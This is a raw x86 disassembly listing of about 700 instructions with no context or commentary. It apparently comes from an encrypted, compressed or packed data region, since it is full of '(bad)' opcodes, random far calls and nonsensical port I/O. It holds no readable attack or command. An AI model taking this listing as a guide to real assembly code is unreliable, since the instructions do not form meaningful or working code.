  412891:	mov    cs,WORD PTR [eax-0x12]
  412894:	xchg   esp,eax
  412895:	lea    ebp,[edi-0x17]
  412898:	pop    edx
  412899:	mov    es:0x39f07d3c,al
  41289f:	inc    ecx
  4128a0:	adc    DWORD PTR [esi+0x2c],ebx
  4128a3:	cli    
  4128a4:	xchg   DWORD PTR [ebx-0x5413856c],edx
  4128aa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4128ab:	mov    al,0x4d
  4128ad:	enter  0xe791,0xab
  4128b1:	pop    ecx
  4128b2:	inc    ebx
  4128b3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4128b4:	mov    al,ds:0x54e6beb6
  4128b9:	call   DWORD PTR [ebx]
  4128bb:	cmp    BYTE PTR [edi],dh
  4128bd:	out    0x93,eax
  4128bf:	jge    0x412897
  4128c1:	(bad)  
  4128c2:	scas   al,BYTE PTR es:[edi]
  4128c3:	call   0x872f:0xc06cd4e7
  4128ca:	outs   dx,BYTE PTR ds:[esi]
  4128cb:	nop
  4128cc:	adc    edi,DWORD PTR [eax+ebp*1+0xd]
  4128d0:	xchg   ecx,eax
  4128d1:	cmp    DWORD PTR [eax],0xb1046672
  4128d7:	inc    eax
  4128d8:	ss std 
  4128da:	cmp    al,0x44
  4128dc:	push   0xffffffe1
  4128de:	mov    edx,0xf5df9575
  4128e3:	sub    eax,0x15ea1634
  4128e8:	push   ebp
  4128e9:	scas   eax,DWORD PTR es:[edi]
  4128ea:	cmc    
  4128eb:	lds    ebp,FWORD PTR [ecx+eax*8-0x71]
  4128ef:	jle    0x412912
  4128f1:	mov    eax,0x10a93eec
  4128f6:	or     DWORD PTR [ebp-0xade3470],esp
  4128fc:	in     eax,0xc3
  4128fe:	or     esp,edx
  412900:	out    0xbe,al
  412902:	pop    ss
  412903:	mov    al,0x1a
  412905:	neg    DWORD PTR [ebp+0x4d]
  412908:	cdq    
  412909:	sti    
  41290a:	dec    ebx
  41290b:	aam    0xa4
  41290d:	xchg   esi,eax
  41290e:	push   ss
  41290f:	(bad)  
  412910:	ficom  WORD PTR [ebp+0x4798220e]
  412916:	ss ja  0x4128d4
  412919:	cmp    DWORD PTR [ebx-0x28],ecx
  41291c:	or     BYTE PTR [esi+0x3a],bl
  41291f:	lds    edi,FWORD PTR [ecx]
  412921:	and    BYTE PTR [ebp+0x3672ad08],al
  412927:	pop    ds
  412928:	call   0x36ee:0x15b04ed1
  41292f:	adc    al,BYTE PTR ds:0x69b9c4ed
  412935:	pop    esp
  412936:	dec    esi
  412937:	jns    0x412976
  412939:	loopne 0x4128f1
  41293b:	cs sub eax,0xb7b2e508
  412941:	test   bl,dl
  412943:	xchg   esi,eax
  412944:	xchg   esi,eax
  412945:	inc    eax
  412946:	push   0x98e724f8
  41294b:	(bad)  
  41294c:	aas    
  41294d:	xor    esi,eax
  41294f:	fwait
  412950:	stos   BYTE PTR es:[edi],al
  412951:	jo     0x412967
  412953:	cmp    BYTE PTR [eax],dl
  412955:	mov    ah,0xea
  412957:	(bad)  
  412958:	mov    ah,0x7c
  41295a:	shr    BYTE PTR [edx],cl
  41295c:	jle    0x412967
  41295e:	pop    ebp
  41295f:	cmc    
  412960:	push   edi
  412961:	xchg   edi,eax
  412962:	or     eax,0xf2478a8f
  412967:	jnp    0x4129af
  412969:	rcl    DWORD PTR [eax-0x1a0bf8ec],1
  41296f:	cmp    bl,ah
  412971:	sbb    BYTE PTR [eax+0x2b4caabc],dl
  412977:	aad    0x1a
  412979:	xor    ecx,DWORD PTR [edx-0x7b]
  41297c:	dec    esi
  41297d:	clc    
  41297e:	scas   eax,DWORD PTR es:[edi]
  41297f:	inc    edx
  412980:	or     BYTE PTR [edx+0x44b28d41],dh
  412986:	cmp    esp,esp
  412988:	mov    bl,0xce
  41298a:	adc    edi,DWORD PTR [eax+0x4496f5c1]
  412990:	push   esi
  412991:	fwait
  412992:	mov    dh,0xce
  412994:	xchg   ebp,eax
  412995:	cmp    edx,edi
  412997:	push   esi
  412998:	fs cmp edx,edx
  41299b:	sbb    BYTE PTR [esi-0xad0eacd],dl
  4129a1:	loope  0x412a0f
  4129a3:	out    0xb2,al
  4129a5:	leave  
  4129a6:	pop    esi
  4129a7:	adc    eax,0xb19caf98
  4129ac:	int3   
  4129ad:	push   ds
  4129ae:	jae    0x412a1a
  4129b0:	in     al,0xe4
  4129b2:	jnp    0x412a30
  4129b4:	fld    DWORD PTR [esi-0x2b]
  4129b7:	jae    0x412a0b
  4129b9:	sbb    ah,dl
  4129bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4129bc:	aam    0x87
  4129be:	or     eax,0xfaca8fcb
  4129c3:	mov    bh,0x5
  4129c5:	adc    eax,0x6384b15a
  4129ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4129cb:	adc    al,0x5b
  4129cd:	and    BYTE PTR [edx-0x53ee75f3],bh
  4129d3:	pop    ebx
  4129d4:	imul   ebx,DWORD PTR [eax+0x55301977],0xffffffe1
  4129db:	push   bx
  4129dd:	push   esp
  4129de:	jo     0x4129c3
  4129e0:	fucomi st,st(6)
  4129e2:	test   eax,0xf909582d
  4129e7:	stos   BYTE PTR es:[edi],al
  4129e8:	fadd   DWORD PTR [edx]
  4129ea:	xchg   ecx,eax
  4129eb:	pusha  
  4129ec:	(bad)  
  4129ed:	aaa    
  4129ee:	das    
  4129ef:	sub    eax,0xb52bcc77
  4129f4:	js     0x4129ae
  4129f6:	aas    
  4129f7:	jb     0x412985
  4129f9:	out    dx,eax
  4129fa:	sbb    DWORD PTR [edi-0x343cba73],edi
  412a00:	sti    
  412a01:	pop    edi
  412a02:	sbb    esi,esp
  412a04:	dec    ebx
  412a05:	dec    ebx
  412a06:	loopne 0x4129b6
  412a08:	mov    cl,0x26
  412a0a:	repnz add dl,BYTE PTR [ecx+0x8]
  412a0e:	mov    dl,0xf6
  412a10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a11:	xor    ch,BYTE PTR [esi+ebx*4-0x4f]
  412a15:	es xor eax,0xf69093b9
  412a1b:	repz dec esi
  412a1d:	jae    0x4129c9
  412a1f:	jecxz  0x412a30
  412a21:	mov    ecx,DWORD PTR [edi-0x68]
  412a24:	jae    0x412a91
  412a26:	and    eax,0xbe072e6c
  412a2b:	loop   0x412a8f
  412a2d:	enter  0xa7e8,0x54
  412a31:	pop    es
  412a32:	retf   
  412a33:	xchg   ebp,eax
  412a34:	cmp    al,BYTE PTR [ecx+0x62]
  412a37:	cdq    
  412a38:	aad    0xa
  412a3a:	jno    0x412a66
  412a3c:	stos   DWORD PTR es:[edi],eax
  412a3d:	sti    
  412a3e:	jns    0x412ab3
  412a40:	adc    al,0xfa
  412a42:	mov    ebx,0x87257dd
  412a47:	out    0x9e,al
  412a49:	sbb    al,al
  412a4b:	sub    dh,BYTE PTR [edi+0xe]
  412a4e:	xor    eax,DWORD PTR [ecx]
  412a50:	and    eax,0xf1301
  412a55:	call   0x7c9f:0x38fc6023
  412a5c:	mov    ch,0x57
  412a5e:	int3   
  412a5f:	popa   
  412a60:	add    al,0xdb
  412a62:	test   al,0xd0
  412a64:	pop    esi
  412a65:	adc    al,0x1
  412a67:	dec    dh
  412a69:	mov    cl,BYTE PTR [eax]
  412a6b:	cmp    al,BYTE PTR [eax]
  412a6d:	sahf   
  412a6e:	icebp  
  412a6f:	fwait
  412a70:	in     eax,0x10
  412a72:	push   edi
  412a73:	in     al,0x26
  412a75:	push   0x48
  412a77:	jecxz  0x412aa2
  412a79:	ret    0xe6b2
  412a7c:	dec    edx
  412a7d:	popf   
  412a7e:	dec    ecx
  412a7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412a80:	and    al,0xd3
  412a82:	or     eax,0x94f9a533
  412a87:	jbe    0x412ae6
  412a89:	int    0x1a
  412a8b:	sub    al,0x19
  412a8d:	or     DWORD PTR fs:[eax],0xfffffff3
  412a91:	(bad)  
  412a92:	popf   
  412a93:	mov    ch,0xc5
  412a95:	pusha  
  412a96:	(bad)  
  412a97:	pushf  
  412a98:	jmp    0x775c:0x2ec138aa
  412a9f:	dec    ecx
  412aa0:	mov    bl,BYTE PTR [ebp+0xe]
  412aa3:	(bad)  
  412aa5:	push   edx
  412aa6:	loope  0x412b16
  412aa8:	push   es
  412aa9:	leave  
  412aaa:	aad    0xb3
  412aac:	push   0xbb068e45
  412ab1:	jg     0x412a80
  412ab3:	cdq    
  412ab4:	call   0xc50c48cf
  412ab9:	xor    eax,0x8ee57b75
  412abe:	lds    eax,FWORD PTR [esi-0x62]
  412ac1:	or     BYTE PTR [edx],bl
  412ac3:	jp     0x412b20
  412ac5:	adc    bh,ah
  412ac7:	out    0xdd,al
  412ac9:	and    ebx,0xe2b2e19d
  412acf:	add    al,0x24
  412ad1:	std    
  412ad2:	mov    ch,0x6d
  412ad4:	sub    DWORD PTR [ebp-0x69fd59f7],edi
  412ada:	jbe    0x412ae9
  412adc:	clc    
  412add:	jge    0x412a7a
  412adf:	fsubr  DWORD PTR [esp+ebx*8+0x484ea29e]
  412ae6:	jl     0x412b15
  412ae8:	xlat   BYTE PTR ds:[ebx]
  412ae9:	sub    dl,ah
  412aeb:	into   
  412aec:	jns    0x412ab0
  412aee:	jnp    0x412b14
  412af0:	rcr    DWORD PTR [ecx],1
  412af2:	mov    al,ds:0x43f4d874
  412af7:	mov    ebx,0x8637cdb1
  412afc:	imul   edi,DWORD PTR [edi-0x9],0x6d7bac5a
  412b03:	fnstsw WORD PTR [eax]
  412b05:	dec    eax
  412b06:	pop    esi
  412b07:	arpl   WORD PTR [esi-0xb],di
  412b0a:	adc    BYTE PTR [eax],ah
  412b0c:	jns    0x412b5b
  412b0e:	dec    ecx
  412b0f:	cmp    al,0x1b
  412b11:	into   
  412b12:	in     eax,dx
  412b13:	cwde   
  412b14:	rol    bl,1
  412b16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412b17:	inc    edx
  412b18:	jmp    0x412b96
  412b1a:	and    al,0x2a
  412b1c:	not    BYTE PTR [ebp-0x69041636]
  412b22:	dec    ecx
  412b23:	mov    dh,0xcd
  412b25:	xor    DWORD PTR [esi+0x24e62585],edi
  412b2b:	in     al,0xe
  412b2d:	iret   
  412b2e:	xchg   ecx,eax
  412b2f:	out    0xbb,eax
  412b31:	push   eax
  412b32:	pop    esi
  412b33:	push   ebp
  412b34:	fdivr  DWORD PTR [ebx]
  412b36:	hlt    
  412b37:	or     si,si
  412b3a:	sbb    cl,BYTE PTR [ebp-0x42]
  412b3d:	xor    eax,0x98ab0317
  412b42:	push   0x6eeb02c1
  412b47:	popf   
  412b48:	xchg   ebp,eax
  412b49:	pusha  
  412b4a:	ss xchg ebp,eax
  412b4c:	and    eax,0xe1d05923
  412b51:	pop    es
  412b52:	lods   eax,DWORD PTR ds:[esi]
  412b53:	je     0x412bcb
  412b55:	pop    ebx
  412b56:	mov    ecx,0xda3a005b
  412b5b:	imul   ebx,DWORD PTR [ebx-0x3eb6b517],0x69
  412b62:	pop    ds
  412b63:	call   0x49bb:0x4a4f8266
  412b6a:	pushf  
  412b6b:	xchg   edi,eax
  412b6c:	repnz push eax
  412b6e:	lods   al,BYTE PTR ds:[esi]
  412b6f:	out    0x83,eax
  412b71:	out    0x53,al
  412b73:	lods   al,BYTE PTR ds:[esi]
  412b74:	mov    bl,BYTE PTR es:[ecx]
  412b77:	dec    edx
  412b78:	add    DWORD PTR [edi-0x48eb600e],eax
  412b7e:	sub    eax,0x81fbaefc
  412b83:	test   bh,bl
  412b85:	cwde   
  412b86:	xor    DWORD PTR [ecx+0x18],edi
  412b89:	xchg   esi,eax
  412b8a:	test   bh,ch
  412b8c:	std    
  412b8d:	sbb    BYTE PTR ds:0xc8438e3b,bl
  412b93:	or     BYTE PTR [ecx+ebp*8],dh
  412b96:	pop    edi
  412b97:	inc    eax
  412b98:	xchg   ebp,eax
  412b99:	sbb    al,al
  412b9b:	call   0x1925741e
  412ba0:	(bad)  
  412ba1:	or     al,0x37
  412ba3:	jb     0x412b36
  412ba5:	add    DWORD PTR [eax-0xe],0x49afab4f
  412bac:	repnz cld 
  412bae:	pusha  
  412baf:	inc    BYTE PTR [ecx+0x75063084]
  412bb5:	mov    ebp,DWORD PTR [esi-0x36]
  412bb8:	enter  0x1dcb,0xd1
  412bbc:	mov    ecx,0x89d20743
  412bc1:	xchg   DWORD PTR [esi+0x1d70f2f],ebx
  412bc7:	icebp  
  412bc8:	repz cmp eax,0xc6d7bbe6
  412bce:	ret    0x837e
  412bd1:	outs   dx,DWORD PTR ds:[esi]
  412bd2:	rol    DWORD PTR [edi-0x61],1
  412bd5:	fist   WORD PTR [ebp+0xa]
  412bd8:	aaa    
  412bd9:	addr16 xchg edi,eax
  412bdb:	jge    0x412c24
  412bdd:	fst    DWORD PTR [ebp+0x5c]
  412be0:	inc    ebp
  412be1:	int3   
  412be2:	add    eax,0x8788e5f3
  412be7:	dec    ecx
  412be8:	sub    ebx,edi
  412bea:	push   0xffffffdb
  412bec:	fdiv   QWORD PTR [ecx-0x25]
  412bef:	and    ch,BYTE PTR [edx-0x2206bea1]
  412bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412bf6:	jmp    0x412c37
  412bf8:	and    BYTE PTR [esi],0xcd
  412bfb:	fld    QWORD PTR [ebx]
  412bfd:	pop    es
  412bfe:	cmp    eax,0x9a67e635
  412c03:	pop    ss
  412c04:	jns    0x412c3c
  412c06:	jo     0x412b9c
  412c08:	outs   dx,BYTE PTR ds:[esi]
  412c09:	jmp    0x412bf2
  412c0b:	add    DWORD PTR [esi],edx
  412c0d:	loop   0x412c13
  412c0f:	xchg   ecx,eax
  412c10:	into   
  412c11:	nop
  412c12:	jmp    0x47127442
  412c17:	mov    eax,gs
  412c19:	(bad)  
  412c1a:	fmulp  st(2),st
  412c1c:	mov    esp,0x2d28f47f
  412c21:	in     eax,dx
  412c22:	xor    BYTE PTR [edi+0x1b],0xfc
  412c26:	and    eax,0x77415ccd
  412c2b:	sbb    esi,ebx
  412c2d:	mov    cl,0xb6
  412c2f:	cmp    DWORD PTR [esi+0xeb5376c],0x1f
  412c36:	loopne 0x412bb8
  412c38:	push   esp
  412c39:	pop    ds
  412c3a:	test   al,0xb1
  412c3c:	repz mov bh,BYTE PTR [esi]
  412c3f:	arpl   di,si
  412c41:	ss xor eax,0x9df5fdf4
  412c47:	mov    esi,0x332f8347
  412c4c:	push   ebp
  412c4d:	aas    
  412c4e:	ror    ebx,cl
  412c50:	xor    ch,BYTE PTR [ebx+eiz*8+0x53d16f4e]
  412c57:	bound  esi,QWORD PTR [eax-0x489f2375]
  412c5d:	int3   
  412c5e:	mov    dh,0xc2
  412c60:	aas    
  412c61:	mov    eax,0x99b3a801
  412c66:	ins    BYTE PTR es:[edi],dx
  412c67:	pop    ebx
  412c68:	inc    ebp
  412c69:	addr16 aas 
  412c6b:	and    DWORD PTR [ebx+0x1c],ebp
  412c6e:	sbb    cl,dh
  412c70:	xor    esi,esi
  412c72:	pop    ebp
  412c73:	or     bh,BYTE PTR [eax]
  412c75:	pop    ebp
  412c76:	fwait
  412c77:	sub    DWORD PTR [esp+edi*4],esi
  412c7a:	inc    esp
  412c7b:	sbb    BYTE PTR [eax-0x60],ah
  412c7e:	xchg   BYTE PTR [edx],cl
  412c80:	inc    ecx
  412c81:	sub    eax,0x1a00fb5e
  412c86:	push   edi
  412c87:	retf   
  412c88:	jae    0x412c60
  412c8a:	adc    esi,ebx
  412c8c:	dec    ebp
  412c8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c8e:	dec    ecx
  412c8f:	inc    esi
  412c90:	cdq    
  412c91:	adc    DWORD PTR [eax+0x92bd8bb],eax
  412c97:	jb     0x412cf7
  412c99:	adc    DWORD PTR [esi],esp
  412c9b:	and    al,0x38
  412c9d:	sub    eax,DWORD PTR [esi]
  412c9f:	cld    
  412ca0:	add    eax,0x50c96f1b
  412ca5:	inc    ebx
  412ca6:	(bad)  
  412ca7:	xchg   ebx,eax
  412ca8:	mov    esp,0xf0d2767
  412cad:	leavew 
  412caf:	mov    WORD PTR [esi],cs
  412cb1:	sahf   
  412cb2:	mov    WORD PTR [eax-0x2d3ab888],gs
  412cb8:	jmp    0x412d28
  412cba:	ret    
  412cbb:	test   BYTE PTR [ecx+edi*2+0x7752c45e],0x6b
  412cc3:	shl    BYTE PTR [eax-0x7f],cl
  412cc6:	stc    
  412cc7:	push   ds
  412cc8:	cmc    
  412cc9:	or     eax,DWORD PTR [esi]
  412ccb:	xchg   esp,eax
  412ccc:	and    al,0x55
  412cce:	push   ebx
  412ccf:	sbb    BYTE PTR [esp+esi*1-0x7e],ch
  412cd3:	push   edi
  412cd4:	and    esi,DWORD PTR [eax+0x77]
  412cd7:	cmp    BYTE PTR [ebx],ah
  412cd9:	stc    
  412cda:	sbb    eax,DWORD PTR es:[ecx]
  412cdd:	inc    edi
  412cde:	out    0xb4,eax
  412ce0:	dec    ebp
  412ce1:	cdq    
  412ce2:	cwde   
  412ce3:	inc    esp
  412ce4:	pop    ebp
  412ce5:	test   BYTE PTR [edi-0x4e],dh
  412ce8:	cmp    DWORD PTR [esi+ebp*2],edi
  412ceb:	(bad)  
  412cec:	sar    DWORD PTR [eax+0x39],cl
  412cef:	mov    edx,0xe8d2ef4e
  412cf4:	aam    0x9f
  412cf6:	test   eax,0x7c5d7172
  412cfb:	data16 outs dx,BYTE PTR ds:[esi]
  412cfd:	mov    DWORD PTR [edi],ebx
  412cff:	adc    bh,bl
  412d01:	inc    esp
  412d02:	push   ds
  412d03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412d04:	shr    cl,0x34
  412d07:	popf   
  412d08:	add    al,0x0
  412d0a:	gs push 0xe915d78d
  412d10:	loop   0x412d80
  412d12:	int    0x50
  412d14:	stos   DWORD PTR es:[edi],eax
  412d15:	loope  0x412d4c
  412d17:	sbb    DWORD PTR [esi+0x4a840a76],0xafd9b8ed
  412d21:	(bad)
  412d26:	push   esi
  412d27:	aam    0x96
  412d29:	outs   dx,DWORD PTR ds:[esi]
  412d2a:	sub    BYTE PTR [ebx+ebx*4+0x60],bl
  412d2e:	inc    esi
  412d2f:	dec    ebx
  412d30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412d31:	pop    ebp
  412d32:	push   cs
  412d33:	popf   
  412d34:	leave  
  412d35:	loop   0x412d7f
  412d37:	cmp    BYTE PTR [esi],0x1d
  412d3a:	jne    0x412cc0
  412d3c:	mov    eax,0x9c326055
  412d41:	hlt    
  412d42:	hlt    
  412d43:	adc    DWORD PTR [edx+edx*2-0x63],ebp
  412d47:	dec    edi
  412d48:	fstp   QWORD PTR [edi+0x9]
  412d4b:	test   DWORD PTR [ebx],edx
  412d4d:	sub    esp,DWORD PTR [edx]
  412d4f:	adc    al,dh
  412d51:	loop   0x412d8f
  412d53:	cmp    eax,0x862b621e
  412d58:	sti    
  412d59:	jecxz  0x412da1
  412d5b:	push   cs
  412d5c:	scas   al,BYTE PTR es:[edi]
  412d5d:	ss xor eax,0xffbbf664
  412d63:	sub    edi,DWORD PTR [esi]
  412d65:	lahf   
  412d66:	jg     0x412daa
  412d68:	inc    edx
  412d69:	das    
  412d6a:	repz cmp ch,BYTE PTR [eax]
  412d6d:	hlt    
  412d6e:	sub    esp,DWORD PTR [ecx+0x2]
  412d71:	adc    edx,DWORD PTR [edi+0x4]
  412d74:	xchg   ecx,eax
  412d75:	push   ss
  412d76:	neg    DWORD PTR [ebp+0x7754d1fd]
  412d7c:	jl     0x412d51
  412d7e:	push   es
  412d7f:	pop    es
  412d80:	dec    eax
  412d81:	lahf   
  412d82:	and    DWORD PTR [ebp+0x60],ebx
  412d85:	pop    DWORD PTR [edx]
  412d87:	mov    ds:0x993654bb,al
  412d8c:	cmp    DWORD PTR [eax+0x2c2c31d2],ecx
  412d92:	aam    0x88
  412d94:	je     0x412d9d
  412d96:	test   DWORD PTR [ebp+eax*4-0x46f1dd8f],edx
  412d9d:	pop    ss
  412d9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d9f:	outs   dx,DWORD PTR ds:[esi]
  412da0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412da1:	xor    ecx,ecx
  412da3:	(bad)  
  412da5:	(bad)  
  412da6:	fidiv  DWORD PTR [ecx+0x459bd768]
  412dac:	inc    ecx
  412dad:	dec    edi
  412dae:	jne    0x412dfc
  412db0:	mov    cl,0xc1
  412db2:	or     esp,DWORD PTR [esi+0x31975391]
  412db8:	sbb    BYTE PTR [ebp+0x39c7e8e9],dh
  412dbe:	mov    bl,0xc0
  412dc0:	cli    
  412dc1:	pop    es
  412dc2:	fisttp DWORD PTR [ebp-0x1e]
  412dc5:	push   es
  412dc6:	hlt    
  412dc7:	xchg   ebp,eax
  412dc8:	jmp    0xe553:0x59c52c6
  412dcf:	inc    ebp
  412dd0:	mov    bl,0xa3
  412dd2:	or     edi,esp
  412dd4:	ja     0x412ddb
  412dd6:	daa    
  412dd7:	(bad)  
  412dd8:	push   edi
  412dd9:	lock dec esi
  412ddb:	and    cl,dh
  412ddd:	leave  
  412dde:	fisubr DWORD PTR es:[edx-0x64353583]
  412de5:	mov    ebp,0xa16532f3
  412dea:	(bad)  
  412deb:	sti    
  412dec:	sbb    ah,al
  412dee:	pop    eax
  412def:	mov    BYTE PTR [edi-0xd8a95a2],dh
  412df5:	mov    edx,0x47b07550
  412dfa:	shr    ebp,0x5c
  412dfd:	addr16 nop
  412dff:	cmp    dl,bh
  412e01:	sub    DWORD PTR [esi-0x3e],esp
  412e04:	sub    eax,0xf1df9d14
  412e09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412e0a:	inc    esp
  412e0b:	dec    edi
  412e0c:	cmp    BYTE PTR [esi],ch
  412e0e:	mov    ds:0x8a9cb0f,al
  412e13:	aaa    
  412e14:	cld    
  412e15:	jnp    0x412e37
  412e17:	push   ebp
  412e18:	clc    
  412e19:	test   al,0x62
  412e1b:	sbb    BYTE PTR [ecx+0xa2115cc],dl
  412e21:	das    
  412e22:	out    dx,al
  412e23:	pop    ecx
  412e24:	sahf   
  412e25:	mov    al,0x16
  412e27:	xor    dh,BYTE PTR [ebp+0x531d081a]
  412e2d:	or     al,0x64
  412e2f:	or     BYTE PTR [edx-0x119286a6],0x91
  412e36:	mov    eax,0x992be336
  412e3b:	cmp    eax,0x62f7796
  412e40:	add    eax,0xfef0911f
  412e45:	mov    DWORD PTR [esi],ecx
  412e47:	mov    bl,0x22
  412e49:	push   0x38
  412e4b:	xchg   DWORD PTR [edi-0x6cca26a5],esi
  412e51:	sbb    BYTE PTR [ebp-0x414fd5e9],0xd3
  412e58:	nop
  412e59:	jbe    0x412dea
  412e5b:	out    0xb6,eax
  412e5d:	inc    eax
  412e5e:	(bad)  
  412e5f:	pop    esi
  412e60:	push   ds
  412e61:	sti    
  412e62:	lock sbb DWORD PTR [esi+0x5],eax
  412e66:	cmp    eax,0xa9771434
  412e6c:	(bad)  
  412e6d:	cwde   
  412e6e:	ror    ecx,cl
  412e70:	(bad)  
  412e71:	rcl    BYTE PTR [edx-0x73],1
  412e74:	mov    WORD PTR [edi+eax*1],ds
  412e77:	lods   al,BYTE PTR ds:[esi]
  412e78:	push   esi
  412e79:	jno    0x412e1c
  412e7b:	out    0xa6,al
  412e7d:	push   edi
  412e7e:	sub    BYTE PTR [ecx+0x7d6eb8d4],al
  412e84:	mov    dl,0x3d
  412e86:	add    ebp,DWORD PTR [ebp-0x30]
  412e89:	add    esp,edi
  412e8b:	scas   al,BYTE PTR es:[edi]
  412e8c:	and    ecx,DWORD PTR [ebp+edi*8+0x5455c707]
  412e93:	imul   esi,DWORD PTR [ebx+0x25241bfe],0x147a8932
  412e9d:	ins    BYTE PTR es:[edi],dx
  412e9e:	and    BYTE PTR [ebp+edx*4+0x25],ch
  412ea2:	aaa    
  412ea3:	int3   
  412ea4:	or     al,0x9d
  412ea6:	stc    
  412ea7:	push   esi
  412ea8:	cli    
  412ea9:	inc    edi
  412eaa:	js     0xf58ebaaf
  412eb0:	mov    edx,eax
  412eb2:	(bad)  
  412eb3:	out    dx,eax
  412eb4:	sti    
  412eb5:	push   0x78
  412eb7:	add    edi,ecx
  412eb9:	push   es
  412eba:	out    dx,eax
  412ebb:	and    bl,ah
  412ebd:	mov    ah,0x61
  412ebf:	sub    DWORD PTR [edx],ecx
  412ec1:	rcl    ebp,cl
  412ec3:	repz push eax
  412ec5:	push   ebp
  412ec6:	(bad)  
  412ec7:	out    0xac,al
  412ec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412eca:	sbb    edx,DWORD PTR [esi-0x4a]
  412ecd:	jp     0x412f02
  412ecf:	ss ret 
  412ed1:	leave  
  412ed2:	push   edx
  412ed3:	ret    
  412ed4:	push   ebp
  412ed5:	and    DWORD PTR [edx-0x64fba0b0],esp
  412edb:	sbb    DWORD PTR [ebx+0x58],0x2a
  412edf:	(bad)  
  412ee0:	mov    edx,0xe51815b
  412ee5:	daa    
  412ee6:	push   cs
  412ee7:	pop    esi
  412ee8:	(bad)  
  412ee9:	aas    
  412eea:	dec    esp
  412eeb:	jmp    0xd204:0xc1e4f15a
  412ef2:	repnz das 
  412ef4:	inc    edi
  412ef5:	mov    ecx,0xdfd83574
  412efa:	out    dx,eax
  412efb:	xchg   ebx,eax
  412efc:	sbb    eax,0xa39229c
  412f01:	pusha  
  412f02:	sbb    eax,0xabd06b9a
  412f07:	scas   eax,DWORD PTR es:[edi]
  412f08:	add    al,0xc9
  412f0a:	(bad)  
  412f0b:	cli    
  412f0c:	pop    eax
  412f0d:	enter  0x6aac,0x94
  412f11:	or     BYTE PTR [edi+ebp*8],0x58
  412f15:	js     0x412e9a
  412f17:	mov    bl,dl
  412f19:	in     al,dx
  412f1a:	stos   DWORD PTR es:[edi],eax
  412f1b:	scas   eax,DWORD PTR es:[edi]
  412f1c:	lahf   
  412f1d:	mov    ebx,0xe6246f5b
  412f22:	icebp  
  412f23:	push   0xc
  412f25:	lea    ebx,[edi+0x4104c65c]
  412f2b:	push   edx
  412f2c:	in     eax,0x89
  412f2e:	fadd   QWORD PTR [esi-0x4f]
  412f31:	cmp    BYTE PTR [edi],ah
  412f33:	sub    ebp,eax
  412f35:	aad    0xcf
  412f37:	mov    esp,0x41129ec9
  412f3c:	xchg   edx,eax
  412f3d:	add    dl,BYTE PTR [ebp+0x55]
  412f40:	pop    edi
  412f41:	jns    0x412f0c
  412f43:	or     DWORD PTR [ecx],esp
  412f45:	dec    ecx
  412f46:	inc    edi
  412f47:	push   esi
  412f48:	or     DWORD PTR [ebx],esp
  412f4a:	mov    dl,0x3f
  412f4c:	sbb    al,0x93
  412f4e:	sar    BYTE PTR [eax+0x2cfa05d5],1
  412f54:	pusha  
  412f55:	sbb    DWORD PTR [ecx+0x45],0x7f8c5a26
  412f5c:	sbb    esi,DWORD PTR [eax]
  412f5e:	mov    ds:0x77551e1c,al
  412f63:	pop    edx
  412f64:	or     eax,0xc7b1ac00
  412f69:	push   0x96839ac5
  412f6e:	sahf   
  412f6f:	jns    0x412f68
  412f71:	ror    edi,0xab
  412f74:	les    edx,FWORD PTR [edx]
  412f76:	fcom   DWORD PTR [esi-0x58]
  412f79:	retf   0x7fb1
  412f7c:	(bad)  
  412f7d:	and    BYTE PTR ss:0x113e1f4d,dl
  412f84:	icebp  
  412f85:	mov    eax,0x679bab4c
  412f8a:	aam    0xa3
  412f8c:	rcr    eax,0x3d
  412f8f:	mov    DWORD PTR [ebp-0x7af5797d],0x81c25113
  412f99:	call   0x7b826f56
  412f9e:	pop    edi
  412f9f:	xchg   esi,eax
  412fa0:	lea    ebx,[edi]
  412fa2:	bnd jbe 0x41300b
  412fa5:	dec    ebx
  412fa6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412fa7:	fist   DWORD PTR [eiz*2-0x6674fcb0]
  412fae:	out    dx,al
  412faf:	in     eax,dx
  412fb0:	loopne 0x412f6e
  412fb2:	mov    WORD PTR [edi],cs
  412fb4:	dec    edx
  412fb5:	sbb    al,0x37
  412fb7:	retf   
  412fb8:	lock sbb ch,BYTE PTR [esi+0x5b6ae0c]
  412fbf:	in     al,dx
  412fc0:	stos   BYTE PTR es:[edi],al
  412fc1:	dec    ebx
  412fc2:	jmp    0x412f95
  412fc4:	jns    0x412f6b
  412fc6:	mov    bh,0xb9
  412fc8:	sub    DWORD PTR [ebx],ebx
  412fca:	xchg   ebx,eax
  412fcb:	or     ecx,esi
  412fcd:	mov    ecx,edi
  412fcf:	aam    0x55
  412fd1:	sbb    eax,0xcb9b13aa
  412fd6:	arpl   WORD PTR [edx+0x11],ax
  412fd9:	push   cs
  412fda:	xor    al,BYTE PTR [ecx+ebp*1+0x1750847c]
  412fe1:	cmp    eax,0x7340ef10
  412fe6:	push   ds
  412fe7:	test   al,0x5c
  412fe9:	(bad)  
  412fea:	mov    ah,BYTE PTR [edx-0x6c]
  412fed:	fs or  al,0x3c
  412ff0:	pop    ecx
  412ff1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ff2:	lea    ebx,[ebp+0x14da8a0f]
  412ff8:	in     eax,0x82
  412ffa:	bound  esp,QWORD PTR [edi-0x6179bee1]
  413000:	popf   
  413001:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413002:	pop    ds
  413003:	pop    eax
  413004:	mov    bl,0xaa
  413006:	xchg   ecx,eax
  413007:	fdiv   QWORD PTR [edi-0x6d]
  41300a:	xor    eax,0x14c8714b
